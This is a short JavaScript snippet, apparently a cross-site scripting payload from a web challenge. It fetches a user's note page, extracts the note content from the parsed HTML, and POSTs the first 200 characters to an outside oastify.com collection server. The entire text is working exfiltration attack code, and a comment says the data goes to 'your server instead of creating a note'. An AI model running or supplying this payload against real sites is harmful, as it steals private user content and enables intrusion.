fetch('/notes/1').then(r=>r.text()).then(d=>{
  let parser = new DOMParser();
  let doc = parser.parseFromString(d, 'text/html');
  let content = doc.querySelector('div.mt-6').innerHTML;
  
  // Extract the first 200 characters
  let truncatedContent = content.substring(0, 200);
  
  // Send to your server instead of creating a note
  fetch('https://66an85cubmljzetr1e0ebgqzuq0hoec3.oastify.com/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({data: truncatedContent})
  });
})
